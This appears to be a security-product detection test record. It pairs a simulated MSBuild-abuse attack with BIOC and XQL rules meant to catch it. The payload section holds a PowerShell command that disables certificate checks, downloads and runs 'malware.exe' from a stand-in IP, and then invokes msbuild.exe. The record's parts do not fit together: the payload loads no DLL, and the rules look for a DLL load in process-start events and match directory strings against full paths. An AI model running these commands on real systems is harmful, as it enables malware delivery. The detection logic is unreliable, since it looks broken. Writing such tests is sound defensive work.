identity.name: MSBuild DLL Loading via Suspicious .NET Process
identity.summary: An attacker executes a .NET process that loads an MSBuild DLL to perform malicious activity. Cortex should detect the suspicious process behavior and DLL loading.
identity.description: An attacker executes a .NET process that loads an MSBuild DLL to perform malicious activity. Cortex should detect the suspicious process behavior and DLL loading.

payload.code:
powershell.exe -ExecutionPolicy Bypass -Command "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; $client = New-Object System.Net.WebClient; $client.DownloadFile('http://192.0.2.10/malware.exe', 'C:\temp\malware.exe')"
start-process -FilePath "C:\temp\malware.exe" -ArgumentList "/s /c C:\temp\msbuild.exe /noconlog /m /p:Configuration=Release /t:Build /p:Platform=x64 /p:OutputPath=C:\temp\output.dll"
msbuild.exe /noconlog /m /p:Configuration=Release /t:Build /p:Platform=x64 /p:OutputPath=C:\temp\output.dll
C:\temp\malware.exe /s /c C:\temp\msbuild.exe /noconlog /m /p:Configuration=Release /t:Build /p:Platform=x64 /p:OutputPath=C:\temp\output.dll

biocs.name: Suspicious .NET Process Loads MSBuild DLL
biocs.description: A .NET process loads an MSBuild DLL from a non-standard path
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name = 'malware.exe'
| filter action_file_path contains 'output.dll'

abiocs.name: MSBuild DLL Loading from Non-Standard Path
abiocs.description: Detects when a .NET process loads MSBuild DLL from unexpected directory
abiocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name = 'malware.exe'
| filter action_file_path contains 'output.dll'
| filter action_file_path not in ('C:\Windows\Microsoft.NET\', 'C:\Program Files\MSBuild\')

xql_queries.name: Detect Suspicious MSBuild DLL Load
